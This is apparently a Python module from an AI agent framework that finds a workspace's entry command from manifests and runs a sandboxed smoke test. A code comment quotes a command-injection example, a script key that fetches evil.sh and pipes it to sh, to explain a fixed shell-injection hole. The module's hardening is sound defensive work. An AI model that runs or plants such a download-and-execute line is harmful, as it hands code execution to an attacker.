"""
Operational behavior verification.

Answers the question the architecture was missing:
    "Can this system ACTUALLY DO the intended operation?"

Not "does the file exist?" — that's structural.
Not "is the tool installed?" — that's capability.
This is behavioral: can we discover an entry point, run a smoke test,
and observe a meaningful signal?

Design principles:
    - Discovery-driven: reads workspace manifests to find run commands
    - No framework names in conditional logic — reason from observable signals
    - Non-destructive: use syntax checks, dry-runs, --help flags, not full builds
    - Portable: works on Windows, Linux, macOS without conditional OS branches
    - Failure classification: distinguishes "wrong completion assumption" from
      "execution failure" — the recovery engine needs to know which it is

Failure classes:
    no_entry_point          — cannot find any runnable artifact
    runtime_missing         — entry point found but required runtime unavailable
    execution_failed        — runtime available, entry point runnable, but exits non-zero
    wrong_completion_assumption — structural + capability OK, behavior fails
    ok                      — all checks pass
"""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from ..state import BehaviorResult, BehaviorSpec, SystemState
from .confinement import Confinement


@dataclass
class WorkspaceOperationalState:
    """Three-tier assessment of whether a workspace is operationally ready."""

    structural_ok: bool  # required files present
    capability_ok: bool  # required runtime available
    behavioral_ok: bool  # smoke test passed

    entry_command: str  # command we'd run for a smoke test
    discovery_method: str  # how the command was found
    failure_class: str  # one of the classes above, or ""
    behavioral_issue: str  # human-readable description of what's wrong
    behavior_result: Optional[BehaviorResult] = None

    def to_summary(self) -> str:
        if self.behavioral_ok:
            return f"operational (entry={self.entry_command[:60]})"
        return f"{self.failure_class}: {self.behavioral_issue[:120]}"

    def is_wrong_completion_assumption(self) -> bool:
        return (
            self.structural_ok
            and self.capability_ok
            and not self.behavioral_ok
            and self.failure_class == "wrong_completion_assumption"
        )


def classify_workspace_state(
    workspace: Path,
    sysstate: SystemState,
    run_smoke_test: bool = True,
) -> WorkspaceOperationalState:
    """
    Three-tier assessment of the workspace's operational state.

    Tier 1: structural — does the workspace contain any runnable artifact?
    Tier 2: capability — is the required runtime available?
    Tier 3: behavioral — does a lightweight smoke test pass?

    Set run_smoke_test=False to skip tier 3 (faster, but less information).
    """
    entry_cmd, method = find_entry_command(workspace, sysstate)

    if not entry_cmd:
        return WorkspaceOperationalState(
            structural_ok=False,
            capability_ok=False,
            behavioral_ok=False,
            entry_command="",
            discovery_method=method,
            failure_class="no_entry_point",
            behavioral_issue="no runnable entry point discovered in workspace",
        )

    # Tier 2: capability — does the runtime needed by this command exist?
    runtime = _extract_runtime(entry_cmd)
    runtime_ok = bool(shutil.which(runtime)) if runtime else True
    if not runtime_ok:
        return WorkspaceOperationalState(
            structural_ok=True,
            capability_ok=False,
            behavioral_ok=False,
            entry_command=entry_cmd,
            discovery_method=method,
            failure_class="runtime_missing",
            behavioral_issue=f"runtime '{runtime}' not found in PATH",
        )

    # Tier 3: behavioral — run the smoke test
    if not run_smoke_test:
        return WorkspaceOperationalState(
            structural_ok=True,
            capability_ok=True,
            behavioral_ok=True,  # assume OK — caller opted out of check
            entry_command=entry_cmd,
            discovery_method=method,
            failure_class="ok",
            behavioral_issue="",
        )

    spec = BehaviorSpec(
        name="workspace_runnable",
        command=entry_cmd,
        expected_signal="",
        timeout_s=20.0,
        discovery_method=method,
    )
    result = _run_behavior(spec, workspace)
    if result.satisfied:
        return WorkspaceOperationalState(
            structural_ok=True,
            capability_ok=True,
            behavioral_ok=True,
            entry_command=entry_cmd,
            discovery_method=method,
            failure_class="ok",
            behavioral_issue="",
            behavior_result=result,
        )
    else:
        return WorkspaceOperationalState(
            structural_ok=True,
            capability_ok=True,
            behavioral_ok=False,
            entry_command=entry_cmd,
            discovery_method=method,
            failure_class="wrong_completion_assumption",
            behavioral_issue=result.reason,
            behavior_result=result,
        )


# A package.json script name is a token, not a shell fragment.
_SAFE_TOKEN = re.compile(r"[A-Za-z0-9._:-]+")


def _split_argv(command: str) -> list[str]:
    """Split a command line into argv without letting a shell interpret it.

    `posix=True` would eat the backslashes in a Windows path (`C:\\Python\\python.exe` becomes
    `C:Pythonpython.exe`); `posix=False` keeps them but also keeps the surrounding quotes, so
    the executable name arrives as `"C:\\...\\python.exe"` — quotes included — and CreateProcess
    reports "cannot find the file specified". Split non-POSIX, then unquote each token.
    """
    tokens = shlex.split(command, posix=False) if os.name == "nt" else shlex.split(command)
    out: list[str] = []
    for tok in tokens:
        if len(tok) >= 2 and tok[0] == tok[-1] and tok[0] in "\"'":
            tok = tok[1:-1]
        if tok:
            out.append(tok)
    return out


def find_entry_command(workspace: Path, sysstate: SystemState) -> tuple[str, str]:
    """
    Discover the command that runs this project by reading its manifests.
    Returns (command, discovery_method).

    Priority: explicit script declarations > conventional entry points > bare files.
    Never hardcodes framework names — reads whatever manifests are present.
    """
    # 1. package.json scripts (any JS/TS/Bun project)
    pkg = workspace / "package.json"
    if pkg.exists():
        try:
            data = json.loads(pkg.read_text(encoding="utf-8", errors="replace"))
            scripts = data.get("scripts", {})
            runtime = (
                sysstate.find_available(["npm", "pnpm", "yarn", "bun"]) or shutil.which("npm") or ""
            )
            if runtime:
                # Script NAMES come from a package.json inside the workspace, which in a
                # scaffolding agent is populated by third-party downloads. Interpolating an
                # arbitrary key into a shell string gave arbitrary execution to whoever wrote
                # the manifest: a key of `build & curl evil.sh | sh` is a valid JSON key.
                # Validated structurally, and the command is argv now, so a key that is not a
                # plain token simply does not match.
                for script_name in ("check", "typecheck", "lint", "build"):
                    if script_name in scripts and _SAFE_TOKEN.fullmatch(script_name):
                        return f"{runtime} run {script_name}", f"package_scripts.{script_name}"
        except Exception:
            pass

    # 2. Cargo.toml → cargo check (non-destructive build validation)
    if (workspace / "Cargo.toml").exists():
        cargo = sysstate.find_available(["cargo"]) or shutil.which("cargo") or ""
        if cargo:
            return f"{cargo} check --quiet", "cargo_toml"

    # 3. go.mod → go vet (static analysis, no compilation artifact)
    if (workspace / "go.mod").exists():
        go = sysstate.find_available(["go"]) or shutil.which("go") or ""
        if go:
            return f"{go} vet ./...", "go_mod"

    # 4. pyproject.toml / setup.py → syntax-check the entry point
    for _manifest in ("pyproject.toml", "setup.cfg", "setup.py"):
        if (workspace / _manifest).exists():
            python = _find_python(sysstate)
            if python:
                python_entry = _find_python_entry(workspace)
                if python_entry:
                    return f'"{python}" -m py_compile "{python_entry}"', "python_manifest"
            break

    # 5. Makefile → look for a 'check' or 'build' or 'test' target
    makefile = workspace / "Makefile"
    if makefile.exists():
        make = shutil.which("make") or shutil.which("gmake") or ""
        if make:
            targets = _parse_make_targets(makefile)
            for t in ("check", "test", "build", "lint"):
                if t in targets:
                    return f"{make} {t}", f"makefile.{t}"

    # 6. Bare Python script with __main__ guard — syntax check it
    for python_path in sorted(workspace.glob("*.py")):
        try:
            text = python_path.read_text(errors="replace")
            if "__main__" in text or python_path.name == "__main__.py":
                python = _find_python(sysstate)
                if python:
                    return f'"{python}" -m py_compile "{python_path.name}"', "bare_python"
        except Exception:
            pass

    # 7. Bare JavaScript — Node syntax check
    for javascript_path in sorted(workspace.glob("*.js")):
        node = sysstate.find_available(["node"]) or shutil.which("node") or ""
        if node:
            return f'"{node}" --check "{javascript_path.name}"', "bare_js"

    return "", "not_found"


def _find_python(sysstate: SystemState) -> str:
    """Find a working Python interpreter, preferring the one running this process."""
    # sys.executable is always valid — it's the interpreter running us right now
    if sys.executable and shutil.which(sys.executable):
        return sys.executable
    return (
        sysstate.find_available(["python", "python3"])
        or shutil.which("python")
        or shutil.which("python3")
        or ""
    )


def _find_python_entry(workspace: Path) -> str:
    """Find the most likely Python entry point in the workspace."""
    for candidate in ("main.py", "app.py", "__main__.py", "run.py", "cli.py"):
        if (workspace / candidate).exists():
            return candidate
    for p in sorted(workspace.glob("*.py")):
        try:
            if "__main__" in p.read_text(errors="replace"):
                return p.name
        except Exception:
            pass
    return ""


def _parse_make_targets(makefile: Path) -> list[str]:
    """Extract target names from a Makefile (lines starting with word:)."""
    import re

    targets = []
    try:
        for line in makefile.read_text(errors="replace").splitlines():
            m = re.match(r"^([a-zA-Z][\w-]*):", line)
            if m:
                targets.append(m.group(1))
    except Exception:
        pass
    return targets


def _extract_runtime(command: str) -> str:
    """Extract the root executable from a shell command string."""
    if not command:
        return ""
    # Strip leading quotes
    token = command.strip().lstrip('"').split('"')[0].split()[0]
    return Path(token).name.lower().removesuffix(".exe")


def _run_behavior(spec: BehaviorSpec, cwd: Path) -> BehaviorResult:
    """Execute a BehaviorSpec smoke test and return the result."""
    # This was the FOURTH execution owner and the only `shell=True` in the tree. It bypassed
    # the normalizer, the placeholder guard, the self-truncating-redirect guard and the
    # confinement filter — none of which it imported — while running commands built from
    # workspace-controlled manifest content. The confinement-owner test even allow-listed it,
    # with the comment "read-only smoke tests".
    confine = Confinement.current()
    reason = confine.check(spec.command, cwd=cwd)
    if reason:
        return BehaviorResult(
            spec=spec,
            exit_code=126,
            stdout="",
            stderr=reason,
            satisfied=False,
            reason=f"refused by confinement: {reason}",
        )
    try:
        argv = _split_argv(spec.command)
        if not argv:
            return BehaviorResult(
                spec=spec,
                exit_code=126,
                stdout="",
                stderr="",
                satisfied=False,
                reason="empty behaviour command",
            )
        result = subprocess.run(
            argv,
            shell=False,
            capture_output=True,
            text=True,
            timeout=spec.timeout_s,
            cwd=str(cwd),
        )
        stdout = (result.stdout or "").strip()
        stderr = (result.stderr or "").strip()
        if result.returncode != 0:
            return BehaviorResult(
                spec=spec,
                exit_code=result.returncode,
                stdout=stdout,
                stderr=stderr,
                satisfied=False,
                reason=f"exit {result.returncode}: {(stderr or stdout)[:120]}",
            )
        if spec.expected_signal and spec.expected_signal not in stdout + stderr:
            return BehaviorResult(
                spec=spec,
                exit_code=result.returncode,
                stdout=stdout,
                stderr=stderr,
                satisfied=False,
                reason=f"expected signal '{spec.expected_signal}' not in output",
            )
        return BehaviorResult(
            spec=spec,
            exit_code=0,
            stdout=stdout,
            stderr=stderr,
            satisfied=True,
            reason=f"smoke test passed (exit 0, {len(stdout)} chars output)",
        )
    except subprocess.TimeoutExpired:
        return BehaviorResult(
            spec=spec,
            exit_code=-1,
            stdout="",
            stderr="",
            satisfied=False,
            reason=f"smoke test timed out after {spec.timeout_s}s",
        )
    except Exception as exc:
        return BehaviorResult(
            spec=spec,
            exit_code=-1,
            stdout="",
            stderr="",
            satisfied=False,
            reason=f"smoke test error: {exc}",
        )
